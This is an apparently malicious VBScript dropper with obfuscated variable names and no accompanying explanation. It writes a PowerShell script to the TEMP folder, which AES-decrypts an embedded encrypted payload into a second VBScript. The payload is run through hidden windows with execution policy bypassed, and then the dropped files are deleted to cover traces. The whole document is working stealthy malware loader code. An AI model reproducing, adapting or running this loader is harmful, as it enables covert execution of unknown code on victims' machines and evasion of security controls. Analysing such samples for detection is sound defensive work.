Dim wr1kwzFoq, nBHN2K, WfvRl0P, mAjD
Set wr1kwzFoq = CreateObject("WScript.Shell")
Set nBHN2K = CreateObject("Scripting.FileSystemObject")
mAjD = wr1kwzFoq.ExpandEnvironmentStrings("%TEMP%") & "\P0QXDWMcGsKAm.ps1"
Set WfvRl0P = nBHN2K.CreateTextFile(mAjD, True)
WfvRl0P.WriteLine "$k=[Convert]::FromBase64String('TKFwWQjRrfab45/4MKan8akuFgrQZzCr+vubfwu3k90=')"
WfvRl0P.WriteLine "$i=[Convert]::FromBase64String('TJqYaH9cTR0E+2heIKCiHQ==')"
WfvRl0P.WriteLine "$c=[Convert]::FromBase64String('7CHXp2UiWFhcfepwaovgmxCf37WzqLnLi6yRfeH62ik9KoI+aW8n3xwAuzSEZf0hZJ6wououkBKimxpxngSGI/IVx55MfZt/eHM5TyDUAG9MLN4+OWuz8p3GbnL2AsM7D0A8rYvEJui5g9N8kLBHVCXq6S+qVw3mG3pZXFETpwgq3gc8JZMNnyBfb1tqJaLkeRV78fGmus0dHGQJJ8f4EoAimSikNuGK94uIhhyg1wNLyZxjDoQOyVvYZ5O8a6gvq9U5LspykUPjUe2y0bi6KQz+F8Ln/960dH9m0x4kspRmeCZHZlHv9Zh2H63xmYb4rkNSYUaY2Z+dxVWJIPZed8ONYQEIsHR/qKixdn3srk8C/XemO3u89DGHgKZ+Y1vMOhueXHWkUoAnavnlNSYFhUGUJAhesN19V1Kebo9cAZitDRxBTBnsBCsv2XOctC4WFxXrpvusi66Z4lRZi43N2fOVY02Pf/qhd1yWFMALMquQdDBPvFzOqFzjCVOBwV50Giqw5MC4pQ08psQcEKgPxLg38FfTa4REc/EfUFO4ZgqKdpbBHqQg+dl3iID+smsHU7wTr4c0kCT8J1ZFQNB4LAGmphRGWzkHTS4JxkrLr/JQ6VSmWm7wJYUzpR+UtxnI3ynFWdelgiVYN/ETdo6JdqK4nocb3W6B7pI3qpLXMfE4MtUn3b85tLh/yMo4FZZ3xENFGdRNCEL4UUMaQPAiogbqrDcp/gKceuB8Y1Ui12Y7XFYbxej0HUddR32rLPTTf/DiISptX9YD+2ZzyGyLbRxVHHEug6ll5I2wHzcc1gqou+DoiB+ZaQbhzO84YT1RHUTV2WxvPlJkoSggSbQmMgMKd/aJG+cKSVDZ33s1m20rPFQykzorvfwOwBXJiZchjpsN8Nh5eq55lExAMaimjG4c0u/hlU2eSonx8LJ81/1MMPmY/Wqafvdu+DbVQhy/tGXeMbz7GRctLQFCPWAcVumDdChpjjwCjRW8swdA/8k=')"
WfvRl0P.WriteLine "$a=[System.Security.Cryptography.Aes]::Create()"
WfvRl0P.WriteLine "$a.Key=$k"
WfvRl0P.WriteLine "$a.IV=$i"
WfvRl0P.WriteLine "$a.Mode=[System.Security.Cryptography.CipherMode]::CBC"
WfvRl0P.WriteLine "$a.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7"
WfvRl0P.WriteLine "$d=$a.CreateDecryptor()"
WfvRl0P.WriteLine "$r=$d.TransformFinalBlock($c,0,$c.Length)"
WfvRl0P.WriteLine "$a.Dispose()"
WfvRl0P.WriteLine "$t=[System.Text.Encoding]::UTF8.GetString($r)"
WfvRl0P.WriteLine "$f=[System.IO.Path]::Combine($env:TEMP,'bDci2sip.vbs')"
WfvRl0P.WriteLine "$enc=New-Object System.Text.UTF8Encoding($false)"
WfvRl0P.WriteLine "[System.IO.File]::WriteAllText($f,$t,$enc)"
WfvRl0P.WriteLine "$p=New-Object System.Diagnostics.ProcessStartInfo"
WfvRl0P.WriteLine "$p.FileName='cmd.exe'"
WfvRl0P.WriteLine "$p.Arguments='/c wscript //nologo '+$f"
WfvRl0P.WriteLine "$p.WindowStyle='Hidden'"
WfvRl0P.WriteLine "$p.CreateNoWindow=$true"
WfvRl0P.WriteLine "$x=[System.Diagnostics.Process]::Start($p)"
WfvRl0P.WriteLine "Start-Sleep -Seconds 5"
WfvRl0P.WriteLine "Remove-Item $f -Force -ErrorAction SilentlyContinue"
WfvRl0P.Close
Set WfvRl0P = Nothing
wr1kwzFoq.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & mAjD & """", 0, True
If nBHN2K.FileExists(mAjD) Then nBHN2K.DeleteFile mAjD, True
Set nBHN2K = Nothing
Set wr1kwzFoq = Nothing
